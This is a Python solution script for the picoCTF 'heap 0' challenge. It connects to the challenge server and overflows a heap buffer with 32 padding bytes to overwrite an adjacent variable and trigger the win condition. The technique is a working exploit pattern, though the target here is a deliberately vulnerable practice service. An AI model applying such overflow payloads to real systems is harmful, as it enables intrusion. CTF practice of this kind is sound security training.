#!/usr/bin/env python3
"""heap 0 - picoCTF
Overflow input_data into adjacent safe_var on the heap to change its value from 'bico'."""

import socket
import time

HOST = "tethys.picoctf.net"
PORT = 60459

s = socket.socket()
s.settimeout(10)
s.connect((HOST, PORT))
time.sleep(1)
s.recv(4096)  # banner

# Write overflow payload
s.sendall(b"2\n")
time.sleep(0.3)
s.recv(4096)

# 32 bytes fills the gap to safe_var, 'x' overwrites first byte
s.sendall(b"A" * 32 + b"x\n")
time.sleep(0.3)
s.recv(4096)

# Check win
s.sendall(b"4\n")
time.sleep(0.5)
data = s.recv(4096)
print(data.decode(errors='replace'))
s.close()
